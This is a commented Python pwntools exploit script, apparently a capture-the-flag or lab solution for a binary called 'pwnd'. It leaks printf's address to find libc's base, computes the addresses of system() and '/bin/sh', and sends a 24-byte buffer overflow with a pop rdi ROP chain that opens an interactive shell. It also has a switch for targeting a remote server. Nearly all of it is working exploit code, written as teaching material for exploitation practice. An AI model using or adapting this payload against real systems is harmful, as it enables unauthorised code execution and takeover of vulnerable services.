#!/bin/python3

from pwn import *
context(arch="amd64")

# As the "gets()" (enter user string) is asked on the same line of the "puts()" (display the message), I had trouble to get and parse the line on my distribution
# See this issue: https://stackoverflow.com/questions/58355505/pwntools-recv-on-output-that-expects-input-directly-after
# So the fix is simply to implement this custom stdin/stdout, and it works better!

remote = 0 # set it to 1 if you exploit a remote server
if remote == 0: 
    cust_stdout = process.PTY
    cust_stdin = process.PTY
    p = process('./pwnd', stdout=cust_stdout, stdin=cust_stdin)
else:
    cust_stdout = subprocess.PIPE
    cust_stdin = subprocess.PIPE
    # p = ... # don't forget to complete this for a remote server (with its IP:port)

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6') # let's also load our libc to calculate offsets

# Step 1 - Leak an address from the libc 
# I also had trouble reading the line using the classic "recvline", because a gets() is asked on the same line than the string displayed by puts()
# Using the "recvuntil" function was also an issue because we can't really predict with wich "pattern" will end the address displayed
# So I chose to use "recvregex" that here uses a regex catching an hexadecimal number of 12 characters
# You can see all PwnTools tubes on: https://docs.pwntools.com/en/stable/tubes.html

address_regex = "0[xX][0-9a-fA-F]{12}"
line = p.recvregex(address_regex)
printf_addr = line[16:]
print(line)
print("[*] Leaked printf address:", printf_addr.decode('utf-8'))

# Step 2 - Calculate the base address of the libc and the address of system() function

libc_base = int(printf_addr.decode("utf-8"), 16) - libc.symbols["printf"] # libc_base_addr = leaked_printf_addr - printf_offset
system_addr = libc_base + libc.symbols["system"] # system_addr = libc_base_addr + system_offset

print("[*] Libc base address:", hex(libc_base))
print("[*] System address in current libc:", hex(system_addr))

# Step 3 - If we want to execute system with '/bin/sh' as first argument, we have to load the address where this string is located in RDI register
# 1st arg = RDI in Unix/Linux calling convention, see https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI
# So we can try to see if we find this string in libc, using the command: strings -tx /usr/lib/x86_64-linux-gnu/libc.so.6 |grep '/bin/sh'
# We do! We get "1881ac /bin/sh" in my libc, so let's use offset 0x1881ac
# As we have the base address of libc, we can calculate where this string is located in the currently loaded instance of libc

# But instead of searching for this string manually in libc, we can ask Pwntools to do that! 
# For that we can use: next(libc.search(b'/bin/sh'))

sh_str_addr = libc_base + next(libc.search(b'/bin/sh')) # libc.search() will return 0x1881ac in my libc
print("[*] /bin/sh address found in libc:", hex(sh_str_addr))

# Now we just have to find a "pop rdi; ret;" gadget --> ropper -f pwnd |grep "rdi" (we do it on the binary here, but as we have libc address we could also do it in libc)
# We get a 'pop rdi; ret;' at 0x4011db, fine!

pop_rdi_gadget = 0x4011db

# Step 4 - Construct the payload to do a return-to-libc (ret2libc) and execute system('/bin/sh')

payload = b'A'*24
payload += p64(pop_rdi_gadget) # pop address of '/bin/sh' to RDI
payload += p64(sh_str_addr) # address of '/bin/sh'
payload += p64(system_addr) # system() address in libc

p.sendline(payload)
p.interactive()
